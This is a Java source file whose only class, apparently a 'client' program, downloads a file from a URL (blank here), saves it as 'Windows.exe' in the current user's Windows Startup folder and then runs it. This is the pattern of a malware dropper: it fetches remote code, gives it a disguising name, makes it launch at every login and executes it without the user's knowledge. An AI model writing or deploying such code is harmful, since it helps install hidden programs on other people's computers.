package com.galluc_erena.client;

import java.io.FileOutputStream;
import java.io.IOException;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;

public class Main {

	public static void main(String[] args) throws IOException {
		String username = System.getProperty("user.name");
		
		URL website = new URL("");
		ReadableByteChannel rbc = Channels.newChannel(website.openStream());
		FileOutputStream fos = new FileOutputStream("C:\\users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Windows.exe");
		fos.getChannel().transferFrom(rbc, 0, Long.MAX_VALUE);
		
		fos.close();
		rbc.close();
		
		String path = "C:/users/" + username + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Windows.exe"; 
		Runtime.getRuntime().exec(path);
	}
	
}
